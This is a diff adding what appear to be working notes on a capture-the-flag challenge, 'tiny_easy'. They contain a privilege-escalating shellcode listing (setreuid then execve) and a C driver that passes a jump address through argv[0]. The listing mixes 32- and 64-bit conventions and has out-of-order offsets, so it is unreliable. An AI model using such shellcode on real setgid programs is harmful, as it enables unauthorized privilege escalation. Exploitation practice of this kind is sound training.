@@ -1,0 +1,50 @@
+readelf -h tiny_easy
+    after loading, entry at 0x08048054
+    header is 52 bytes
+    single program header starts at byte 52 (0x34), ends at byte 84 (0x54)
+    -> this lines up with program entry point: the actual code is in bytes [84:]
+    
+pop eax
+pop edx
+mov edx, dword ptr [edx]
+call edx
+
+2nd item on the stack when program is loaded ends up in edx: call (*edx)()
+
+-> idea: program is not linked against anything useful (or anything at all really), so we can't jump to something pre-existing
+but we could inject shellcode as an argument and maybe jump to that
+the 2nd item on the stack is the 'program_filename': can we change environment s.t. this program filename contains a jump to our injected shellcode (on the stack)?
+    -> note stack is rwx, but still randomized location on program load
+
+--- piece 1: shellcode
+
+shellcode: setreuid(getegid(), getegid()); execve(argv[0], NULL, NULL);
+
+   0:   b8 32 00 00 00          mov    eax,0x32     ; getegid
+   5:   0f 05                   syscall             
+   9:   89 c1                   mov    ecx,eax      ; setreuid arg1
+   7:   89 c3                   mov    ebx,eax      ; setreuid arg0
+   b:   b8 46 00 00 00          mov    eax,0x46     ; setreuid
+  10:   0f 05                   syscall             
+  12:   8d 1c 24                lea    ebx,[rsp]    ; execve arg0 (pointer to argv[0])
+  15:   31 c9                   xor    ecx,ecx      ; execve arg1
+  17:   31 d2                   xor    edx,edx      ; execve arg2
+  19:   0f 05                   syscall             
+
+--- piece 2: inject custom "program_filename" onto stack
+running with a custom environment: env -i TEST="TEST" bash -l -c "gdb tiny_easy"
+    - not necessary though, can just pass payload through argv
+running from a symlink DOES use the symlink's name
+    maybe run a program which creates a virtual file symlinked to tiny_easy, and give virtual file name=payload?
+    https://www.man7.org/linux/man-pages/man2/symlink.2.html
+        - nope -- could create a symlink in /tmp directory with arbitrary name, but it will still have "/tmp" at the start
++++ overthinking it: execve() will do the trick just fine. argv[0] by CONVENTION is the filename, but we can just specify our own
+    int main() {
+        char* args[] = {"jmp_addr", "shellcode", NULL};
+        execve("/home/tiny_easy/tiny_easy", args, NULL);
+    }
+
+--- piece 3: identifying location of shellcode on stack
+... maybe since we're calling execve(), stack will remain in the location it is in our driver program?
+    
+https://lwn.net/Articles/630727/
